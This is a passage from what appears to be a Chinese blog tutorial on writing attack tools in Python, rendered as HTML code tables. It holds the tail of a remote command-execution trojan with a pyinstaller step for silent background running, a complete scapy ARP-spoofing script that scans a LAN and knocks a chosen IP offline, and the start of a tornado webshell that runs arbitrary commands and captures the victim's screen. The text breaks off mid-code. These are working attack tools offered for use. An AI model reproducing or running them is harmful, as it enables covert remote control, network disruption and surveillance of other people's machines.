punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        cmd <span class=\"token operator\">=</span> newsct<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4096</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#接收到的各种指令，4096 为大小</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token comment\"># 判断 cmd 是否有内容</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"console:\"</span> <span class=\"token operator\">+</span> cmd<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token comment\"># 以下可以做控制操作</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            res <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>popen<span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            newsct<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            res<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    newsct<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><p>client</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># client 控制端</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> socket <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>tcpsocket <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">(</span>AF_INET<span class=\"token punctuation\">,</span>SOCK_STREAM<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>setAddress <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'127.0.0.1'</span><span class=\"token punctuation\">,</span><span class=\"token number\">12345</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>tcpsocket<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span>setAddress<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    sendcmd <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'client&gt;&gt;'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sendcmd<span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        tcpsocket<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>sendcmd<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token comment\"># 接收执行后的结果</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    resv <span class=\"token operator\">=</span> tcpsocket<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4096</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>recv<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\"># close</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>tcpsocket<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><h3 id=\"打包\"><a class=\"anchor\" href=\"#打包\">#</a> 打包</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>pyinstaller <span class=\"token parameter variable\">-F</span> server.py <span class=\"token parameter variable\">-w</span> <span class=\"token comment\"># -w 为后台静默运行</span></pre></td></tr></tbody></table></figure><h1 id=\"312-实战自编阻网小军刀-木马-蠕虫\"><a class=\"anchor\" href=\"#312-实战自编阻网小军刀-木马-蠕虫\">#</a> 3.12 实战自编阻网小军刀、木马、蠕虫</h1>\n<h2 id=\"涉及技术\"><a class=\"anchor\" href=\"#涉及技术\">#</a> 涉及技术</h2>\n<ul>\n<li>网络技术</li>\n<li>内网渗透</li>\n<li>数据包和头部定义</li>\n<li>实用编程语言 python</li>\n</ul>\n<h2 id=\"编写-2\"><a class=\"anchor\" href=\"#编写-2\">#</a> 编写</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Author       : zhong</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>since        : 2022-08-26 10:20:00</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>LastAuthor   : zhong</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>lastTime     : 2022-08-26 10:41:31</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>blog         : http://dpm12345.cn/</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>email        : 1006975692@qq.com</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>'''</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># 攻击指定 ip 实现断网 - ARP</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># 原理：通过扫描当前攻击机的 IP 地址，得到内网的所有 ip 所在网关</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># 组成 ARP 数据包，对网关内的主机先发起 Ping，有发现主机存活</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># 获得存活 ip 列表，选择需要攻击 ip，发起攻击</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># 步骤</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># 1. 获得当前的 ip 及网关  route print</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\"># 2. 封装 ARP 数据包，以太网的包结构形式来发起 ping，得到存活主机列表</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\"># 3. 得到存活主机列表</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\"># 4. 选择需要攻击或阻网的 ip</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\"># 5.ARP 攻击 (封包 / 发包)---》代理，抓包</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\"># 6. 设置攻击时长</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># pip install scapy</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">from</span> scapy<span class=\"token punctuation\">.</span><span class=\"token builtin\">all</span> <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">scan2spoof</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    netcard <span class=\"token operator\">=</span> <span class=\"token string\">'Intel(R) Wi-Fi 6 AX201 160MHz'</span>  <span class=\"token comment\"># 攻击的网卡 (网卡名字，在上面命令得到的接口列表里)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    cmdcode <span class=\"token operator\">=</span> <span class=\"token string\">'route print'</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token comment\"># 执行 cmd 命令获得当前主机 ip 和网关</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">for</span> line <span class=\"token keyword\">in</span> os<span class=\"token punctuation\">.</span>popen<span class=\"token punctuation\">(</span>cmdcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token comment\"># 通过 line 获得 IPv4 和网关</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        s <span class=\"token operator\">=</span> line<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token keyword\">if</span> s<span class=\"token punctuation\">.</span>startswith<span class=\"token punctuation\">(</span><span class=\"token string\">'0.0.0.0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            ip_list <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            wg <span class=\"token operator\">=</span> ip_list<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span>  <span class=\"token comment\"># 网关</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            ip <span class=\"token operator\">=</span> ip_list<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span>  <span class=\"token comment\"># ip</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>            <span class=\"token comment\"># print(wg,ip)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"使用的网卡是：{}\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>netcard<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"本机的上网IP是：{}\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"本机的上网网关：{}\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>wg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token comment\"># 封装一个 ARP 的数据包，符合以太网的包定义</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    arppk <span class=\"token operator\">=</span> Ether<span class=\"token punctuation\">(</span>dst<span class=\"token operator\">=</span><span class=\"token string\">\"ff:ff:ff:ff:ff:ff\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">/</span>ARP<span class=\"token punctuation\">(</span>pdst<span class=\"token operator\">=</span>wg<span class=\"token operator\">+</span><span class=\"token string\">\"/24\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token comment\"># 将包抛出去</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    ansip<span class=\"token punctuation\">,</span> unansip <span class=\"token operator\">=</span> srp<span class=\"token punctuation\">(</span>arppk<span class=\"token punctuation\">,</span> iface<span class=\"token operator\">=</span>netcard<span class=\"token punctuation\">,</span> timeout<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> verbose<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"扫描到{}台在线主机\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>ansip<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"扫描到{}台不在线主机\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>unansip<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    ansresip <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token keyword\">for</span> s<span class=\"token punctuation\">,</span> r <span class=\"token keyword\">in</span> ansip<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        ansresip<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>r<span class=\"token punctuation\">.</span>psrc<span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">.</span>hwsrc<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># ip,mac</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    ansresip<span class=\"token punctuation\">.</span>sort<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 去重排序</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token keyword\">for</span> ip<span class=\"token punctuation\">,</span> mac <span class=\"token keyword\">in</span> ansresip<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">,</span> <span class=\"token string\">\"--------&gt;\"</span><span class=\"token punctuation\">,</span> mac<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token comment\"># 代理 / 抓包</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token comment\"># 阻断网络</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    vip <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入需要攻击的IP：\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    ttl <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入需要攻击的时间(秒)：\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token comment\"># 以下实现 arp 攻击即可</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>ttl<span class=\"token operator\">*</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>        sendp<span class=\"token punctuation\">(</span>Ether<span class=\"token punctuation\">(</span>dst<span class=\"token operator\">=</span><span class=\"token string\">\"ff:ff:ff:ff:ff:ff\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">/</span>ARP<span class=\"token punctuation\">(</span>pdst<span class=\"token operator\">=</span>vip<span class=\"token punctuation\">,</span> psrc<span class=\"token operator\">=</span>wg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> verbose<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>        sendp<span class=\"token punctuation\">(</span>Ether<span class=\"token punctuation\">(</span>dst<span class=\"token operator\">=</span><span class=\"token string\">\"ff:ff:ff:ff:ff:ff\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">/</span>ARP<span class=\"token punctuation\">(</span>pdst<span class=\"token operator\">=</span>wg<span class=\"token punctuation\">,</span> psrc<span class=\"token operator\">=</span>vip<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> verbose<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"对{}的ARP攻击完成\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>vip<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre><span class=\"token comment\"># 程序入口</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    scan2spoof<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><h1 id=\"313-webshell-一招走天下\"><a class=\"anchor\" href=\"#313-webshell-一招走天下\">#</a> 3.13 webshell 一招走天下</h1>\n<p><strong>webshell，截屏远程控制器</strong></p>\n<h2 id=\"技术分解\"><a class=\"anchor\" href=\"#技术分解\">#</a> 技术分解</h2>\n<ul>\n<li>\n<p>webapp：web 应用</p>\n</li>\n<li>\n<p>http:80/https:443/ws:80/wss:443</p>\n</li>\n<li>\n<p>http(https)/tcp/udp/ws(wss)</p>\n</li>\n<li>\n<p>cmd/shell 等</p>\n</li>\n<li>\n<p>html/css/js 等</p>\n</li>\n<li>\n<p>python/asp/php/jsp 等</p>\n</li>\n<li>\n<p>二进制等</p>\n</li>\n<li>\n<p>流控制等</p>\n</li>\n</ul>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Author       : zhong</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>since        : 2022-08-27 19:20:58</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>LastAuthor   : zhong</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>lastTime     : 2022-08-27 19:57:51</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>blog         : http://dpm12345.cn/</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>email        : 1006975692@qq.com</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>'''</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># python webshell</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># 步骤:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># 1. 构建一款 HTTP 协议服务器</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># 2. 独立开放特定端口</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># 3. 构建一个视图 view (mvc)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># 4. 执行 shell 命令 + 截取对方的桌面</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\"># 引入</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\"># tornado 框架</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\"># pyautogui 截屏</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\"># os</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">from</span> tornado<span class=\"token punctuation\">.</span>web <span class=\"token keyword\">import</span> RequestHandler<span class=\"token punctuation\">,</span> Application</pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">from</span> tornado<span class=\"token punctuation\">.</span>ioloop <span class=\"token keyword\">import</span> IOLoop</pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">from</span> tornado<span class=\"token punctuation\">.</span>options <span class=\"token keyword\">import</span> options<span class=\"token punctuation\">,</span> parse_command_line<span class=\"token punctuation\">,</span> define</pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">from</span> tornado<span class=\"token punctuation\">.</span>httpserver <span class=\"token keyword\">import</span> HTTPServer</pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">import</span> pyautogui</pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>define<span class=\"token punctuation\">(</span><span class=\"token string\">'port'</span><span class=\"token punctuation\">,</span> default<span class=\"token operator\">=</span><span class=\"token number\">14444</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">help</span><span class=\"token operator\">=</span><span class=\"token string\">'这是http协议通信端口'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">index</span><span class=\"token punctuation\">(</span>RequestHandler<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">get</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token comment\"># 定义获取 url 的参数</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        key <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>get_query_argument<span class=\"token punctuation\">(</span><span class=\"token string\">\"key\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">if</span> key <span class=\"token operator\">==</span> <span class=\"token string\">'screenshot'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            <span class=\"token comment\"># 截屏</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            img <span class=\"token operator\">=</span> pyautogui<span class=\"token punctuation\">.</span>screenshot<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            img<span class=\"token punctuation\">.</span>save<span class=\"token punctuation\">(</span><span class=\"token string\">\"screenshot.jpg\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            <span class=\"token comment\"># 二进制返回</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>            pic <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'screenshot.jpg'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            pics <span class=\"token operator\">=</span> pic<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>            self<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>pics<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            self<span class=\"token punctuation\">.</span>set_header<span class=\"token punctuation\">(</span><span class=\"token string\">'Content-Type'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"image/png\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>            res <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>popen<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>            self<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">makeapp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">return</span> Application<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token string\">r'/'</span><span class=\"token punctuation\">,</span> index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    parse_command_line<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    app <span class=\"token operator\">=</span> makeapp<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td 